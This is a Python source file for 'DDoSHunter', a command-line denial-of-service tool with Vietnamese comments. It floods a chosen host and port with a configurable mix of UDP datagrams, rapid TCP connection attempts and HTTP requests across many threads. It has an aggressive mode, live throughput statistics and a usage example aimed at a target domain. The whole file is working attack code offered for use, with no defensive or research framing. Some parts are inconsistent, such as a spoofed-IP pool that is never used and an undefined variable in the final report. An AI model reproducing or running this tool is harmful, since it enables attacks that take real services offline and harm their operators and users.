#!/usr/bin/env python3
import sys
import os
import multiprocessing
import threading
import random
import time
import argparse
import logging
import socket
import struct
import concurrent.futures
from datetime import datetime
import signal

# Try to import optional dependencies
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False
    print("psutil không được cài đặt. Chạy 'pip install psutil' để cài đặt.")

try:
    from scapy.all import *
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("Scapy không được cài đặt. Chạy 'pip install scapy' để cài đặt.")

# Công cụ DDoS Hunter hiệu suất cao
class DDoSHunter:
    def __init__(self, target_ip, target_port, processes, duration, log_file=None, 
                 attack_ratio="40:30:20:10", batch_size=500, delay=0.005, 
                 use_socket_only=True, aggressive=True, max_workers=20):
        self.target_ip = target_ip
        self.target_port = target_port
        self.use_socket_only = use_socket_only
        self.aggressive = aggressive
        self.max_workers = max_workers
        
        # Xác định số quy trình dựa trên CPU
        if PSUTIL_AVAILABLE:
            available_cores = psutil.cpu_count() or 2
            if self.aggressive:
                self.processes = min(processes, available_cores * 2)
            else:
                self.processes = min(processes, available_cores)
        else:
            self.processes = min(processes, 6 if self.aggressive else 2)
            
        self.duration = duration
        
        # Tùy chỉnh batch size dựa vào chế độ
        if self.aggressive:
            self.batch_size = max(200, min(batch_size, 5000))
        else:
            self.batch_size = max(50, min(batch_size, 1000))
            
        # Giảm độ trễ trong chế độ tăng cường
        self.delay = max(0, min(delay, 0.1))
        
        # Counters cho thống kê
        self.packet_count = multiprocessing.Value('i', 0)
        self.syn_count = multiprocessing.Value('i', 0)
        self.udp_count = multiprocessing.Value('i', 0)
        self.ack_count = multiprocessing.Value('i', 0)
        
        # Tạo IP giả với nhiều địa chỉ hơn
        ip_pool_size = 100000 if self.aggressive else 10000
        self.fake_ips = list({f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}" 
                             for _ in range(ip_pool_size)})
        
        # Phân tích tỷ lệ tấn công
        try:
            ratios = [float(x) for x in attack_ratio.split(":")]
            if len(ratios) != 4 or sum(ratios) != 100:
                raise ValueError
            self.syn_ratio, self.udp_ratio, self.ack_ratio, self.other_ratio = [r/100 for r in ratios]
        except ValueError:
            raise ValueError("Tỷ lệ tấn công phải có dạng SYN:UDP:ACK:OTHER, tổng=100 (ví dụ: 40:30:20:10)")

        # Thiết lập logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s [%(levelname)s] %(message)s',
            handlers=[
                logging.StreamHandler(),
                logging.FileHandler(log_file) if log_file else logging.NullHandler()
            ]
        )
        self.logger = logging.getLogger()

        # Kiểm tra nếu chỉ dùng socket
        if self.use_socket_only:
            self.logger.info("Sử dụng Socket trực tiếp không cần quyền root")
            
        # Kiểm tra nếu scapy khả dụng
        elif not SCAPY_AVAILABLE:
            self.logger.warning("Scapy không khả dụng. Tự động chuyển sang sử dụng socket.")
            self.use_socket_only = True

        # Tạo list các payload HTTP tùy chỉnh cho tấn công Layer 7
        self.http_payloads = [
            f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
            f"POST /login HTTP/1.1\r\nHost: {self.target_ip}\r\nContent-Length: {random.randint(200, 5000)}\r\n\r\n",
            f"HEAD / HTTP/1.1\r\nHost: {self.target_ip}\r\nConnection: keep-alive\r\n\r\n",
            f"GET /?{random.randint(1000, 9999999)} HTTP/1.1\r\nHost: {self.target_ip}\r\n\r\n"
        ]

    def send_syn_packet(self):
        """Gửi gói SYN tối ưu"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            s.settimeout(0.03)  # Timeout ngắn để tăng tốc
            # Socket options tăng hiệu suất
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            # Kết nối không hoàn chỉnh để gửi SYN
            s.connect_ex((self.target_ip, self.target_port))
            s.close()
            with self.syn_count.get_lock():
                self.syn_count.value += 1
            return True
        except:
            return False

    def send_udp_packet(self):
        """Gửi gói UDP tối ưu"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Tạo dữ liệu ngẫu nhiên có kích thước lớn
            data = os.urandom(2048)  # Kích thước gói lớn hơn
            # Socket option tăng hiệu suất
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)
            s.sendto(data, (self.target_ip, self.target_port))
            s.close()
            with self.udp_count.get_lock():
                self.udp_count.value += 1
            return True
        except:
            return False

    def send_ack_packet(self):
        """Gửi ACK tối ưu"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setblocking(False)
            s.settimeout(0.03)
            # Socket options tăng hiệu suất
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            # Kết nối với timeout ngắn
            err = s.connect_ex((self.target_ip, self.target_port))
            if err == 0 or err == 10035 or err == 115:  # EWOULDBLOCK/EINPROGRESS
                s.close()
            with self.ack_count.get_lock():
                self.ack_count.value += 1
            return True
        except:
            return False

    def send_http_flood(self):
        """Gửi HTTP flood (Layer 7)"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            # Kết nối TCP
            if s.connect_ex((self.target_ip, self.target_port)) == 0:
                # Chọn payload HTTP ngẫu nhiên
                payload = random.choice(self.http_payloads)
                # Gửi request HTTP
                s.send(payload.encode())
                s.close()
                return True
            s.close()
            return False
        except:
            return False

    def attack_process(self, stop_event):
        """Quy trình tấn công đa luồng"""
        try:
            # Tạo ID thread/process để xáo trộn seeding
            thread_id = threading.get_ident() % 10000
            # Khởi tạo bộ sinh số ngẫu nhiên riêng cho mỗi thread
            local_random = random.Random(time.time() + thread_id)
            
            # ThreadPoolExecutor cho tấn công đa luồng hiệu quả
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
                while not stop_event.is_set():
                    futures = []
                    success_count = 0
                    
                    # Gửi theo batch để tối đa hiệu suất
                    for _ in range(self.batch_size):
                        r = local_random.random()
                        
                        if r < self.syn_ratio:
                            future = executor.submit(self.send_syn_packet)
                        elif r < self.syn_ratio + self.udp_ratio:
                            future = executor.submit(self.send_udp_packet)
                        elif r < self.syn_ratio + self.udp_ratio + self.ack_ratio:
                            future = executor.submit(self.send_ack_packet)
                        else:
                            future = executor.submit(self.send_http_flood)
                            
                        futures.append(future)
                    
                    # Thu thập kết quả từ futures
                    for future in concurrent.futures.as_completed(futures):
                        if future.result():
                            success_count += 1
                    
                    # Cập nhật tổng số gói thành công
                    with self.packet_count.get_lock():
                        self.packet_count.value += success_count
                    
                    # Delay nếu cần
                    if self.delay > 0:
                        time.sleep(self.delay)
                    
        except Exception as e:
            self.logger.error(f"Lỗi quy trình: {e}")

    def stats_process(self, stop_event):
        """Quy trình thống kê hiệu năng"""
        # Ghi nhận thời gian bắt đầu và các biến thống kê
        local_start_time = time.time()
        last_time = local_start_time
        last_count = 0
        peak_rate = 0
        total_samples = 0
        total_rate = 0
        
        while not stop_event.is_set():
            try:
                time.sleep(0.5)  # Cập nhật nhanh hơn
                current_time = time.time()
                time_diff = current_time - last_time
                
                with self.packet_count.get_lock(), self.syn_count.get_lock(), self.udp_count.get_lock(), self.ack_count.get_lock():
                    current_count = self.packet_count.value
                    syn_count = self.syn_count.value
                    udp_count = self.udp_count.value
                    ack_count = self.ack_count.value
                    
                    # Tính tốc độ dựa trên thời gian chính xác
                    if time_diff > 0:
                        packet_rate = int((current_count - last_count) / time_diff)
                    else:
                        packet_rate = 0
                    
                    # Cập nhật thống kê
                    peak_rate = max(peak_rate, packet_rate)
                    total_samples += 1
                    total_rate += packet_rate
                    
                    # Cập nhật các biến cho lần sau
                    last_count = current_count
                    last_time = current_time
                    
                    elapsed = current_time - local_start_time
                    
                    # Lấy thông tin hệ thống
                    if PSUTIL_AVAILABLE:
                        cpu_usage = psutil.cpu_percent()
                        mem_usage = psutil.virtual_memory().percent
                        cpu_info = f"CPU: {cpu_usage:.1f}% | RAM: {mem_usage:.1f}%"
                    else:
                        cpu_info = "CPU: N/A | RAM: N/A"
                    
                    # Tính tốc độ trung bình
                    avg_rate = total_rate / total_samples if total_samples > 0 else 0
                    
                    # Thông tin chi tiết từng loại tấn công
                    attack_details = f"SYN: {syn_count} | UDP: {udp_count} | ACK: {ack_count} | HTTP: {current_count - syn_count - udp_count - ack_count}"
                    
                    # Hiển thị thống kê
                    self.logger.info(
                        f"Đã gửi: {current_count:,} gói | "
                        f"Tốc độ: {packet_rate:,} gói/giây | "
                        f"TB: {avg_rate:.1f} | "
                        f"Cao nhất: {peak_rate:,} | "
                        f"{cpu_info} | "
                        f"Thời gian: {elapsed:.1f}s\n{attack_details}"
                    )
            except Exception as e:
                self.logger.error(f"Lỗi thống kê: {e}")

    def run(self):
        """Chạy tấn công DDoS"""
        self.logger.info(f"Bắt đầu tấn công đến {self.target_ip}:{self.target_port}")
        self.logger.info(f"Số quy trình: {self.processes} | Thời gian: {self.duration}s | Batch size: {self.batch_size} | Delay: {self.delay}s")
        self.logger.info(f"Tỷ lệ tấn công: SYN={self.syn_ratio*100:.0f}% UDP={self.udp_ratio*100:.0f}% ACK={self.ack_ratio*100:.0f}% HTTP={self.other_ratio*100:.0f}%")
        self.logger.info(f"Thời điểm: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        self.logger.info(f"Phương thức: {'Socket trực tiếp' if self.use_socket_only else 'Scapy + Socket'}")
        
        # Tạo stop event
        try:
            manager = multiprocessing.Manager()
            stop_event = manager.Event()
        except:
            # Fallback nếu có vấn đề
            self.logger.warning("Không thể tạo multiprocessing Manager, sử dụng threading.Event")
            stop_event = threading.Event()
        
        # Khởi động quy trình thống kê
        stats = threading.Thread(target=self.stats_process, args=(stop_event,))
        stats.daemon = True
        stats.start()
        
        # Khởi động quy trình tấn công
        processes = []
        
        # Sử dụng Thread cho mọi quy trình để tối ưu trên Replit
        for i in range(self.processes):
            thread = threading.Thread(target=self.attack_process, args=(stop_event,))
            thread.daemon = True
            thread.start()
            processes.append(thread)
            self.logger.info(f"Khởi động luồng tấn công {i+1}/{self.processes}")
        
        # Chờ trong thời gian chỉ định
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            self.logger.warning("Người dùng dừng chương trình...")
        
        # Dừng tất cả quy trình
        stop_event.set()
        
        # Join threads
        for proc in processes:
            proc.join(timeout=2)
        stats.join(timeout=2)
        
        # Báo cáo tổng kết
        with self.packet_count.get_lock(), self.syn_count.get_lock(), self.udp_count.get_lock(), self.ack_count.get_lock():
            elapsed = time.time() - local_start_time if 'local_start_time' in locals() else self.duration
            packet_rate = self.packet_count.value / elapsed if elapsed > 0 else 0
            
            self.logger.info(f"Kết thúc! Tổng số gói: {self.packet_count.value:,}")
            self.logger.info(f"Chi tiết: SYN={self.syn_count.value:,} | UDP={self.udp_count.value:,} | ACK={self.ack_count.value:,} | HTTP={(self.packet_count.value-self.syn_count.value-self.udp_count.value-self.ack_count.value):,}")
            self.logger.info(f"Tốc độ trung bình: {packet_rate:.1f} gói/giây")
            self.logger.info(f"Thời điểm kết thúc: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

def signal_handler(sig, frame):
    """Xử lý tín hiệu Ctrl+C"""
    print("\n[!] Đang dừng chương trình...")
    sys.exit(0)

if __name__ == "__main__":
    # Xử lý tín hiệu Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)
    
    # Cấu hình CLI
    parser = argparse.ArgumentParser(
        description="DDoSHunter: Công cụ tấn công DDoS hiệu suất cao",
        epilog="Ví dụ: python3 ddos_hunter.py --host target.com --port 80 --processes 4 --duration 60 --batch-size 1000 --delay 0.001 --aggressive"
    )
    parser.add_argument("--host", required=True, help="Địa chỉ IP hoặc tên miền đích")
    parser.add_argument("--port", type=int, required=True, help="Cổng đích (ví dụ: 80, 443)")
    parser.add_argument("--processes", type=int, default=4, help="Số luồng/quy trình (mặc định: 4)")
    parser.add_argument("--duration", type=int, default=60, help="Thời gian tấn công (giây, mặc định: 60)")
    parser.add_argument("--log", help="File log (ví dụ: ddos.log)")
    parser.add_argument("--attack-ratio", default="40:30:20:10", help="Tỷ lệ tấn công SYN:UDP:ACK:HTTP, tổng=100 (mặc định: 40:30:20:10)")
    parser.add_argument("--batch-size", type=int, default=500, help="Số gói mỗi lần gửi (mặc định: 500)")
    parser.add_argument("--delay", type=float, default=0.005, help="Độ trễ giữa các đợt gửi (giây, mặc định: 0.005)")
    parser.add_argument("--max-workers", type=int, default=20, help="Số luồng con tối đa cho mỗi process (mặc định: 20)")
    parser.add_argument("--aggressive", "-a", action="store_true", help="Chế độ tấn công tăng cường")
    
    args = parser.parse_args()
    
    # Hiển thị banner
    print(f"""
╔═══════════════════════════════════════════════════════╗
║                    DDOS HUNTER                        ║
║                                                       ║
║  Mục tiêu: {args.host}:{args.port}                     
║  Thời gian: {args.duration} giây | Tiến trình: {args.processes} | {"Chế độ tăng cường" if args.aggressive else "Chế độ thường"}
╚═══════════════════════════════════════════════════════╝
""")
    
    try:
        hunter = DDoSHunter(
            target_ip=args.host,
            target_port=args.port,
            processes=args.processes,
            duration=args.duration,
            log_file=args.log,
            attack_ratio=args.attack_ratio,
            batch_size=args.batch_size,
            delay=args.delay,
            max_workers=args.max_workers,
            aggressive=args.aggressive
        )
        hunter.run()
    except ValueError as e:
        logging.error(f"Lỗi cấu hình: {e}")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[!] Ngắt bởi người dùng, đang thoát...")
        sys.exit(0)
    except Exception as e:
        logging.error(f"Lỗi khởi động: {e}")
        sys.exit(1)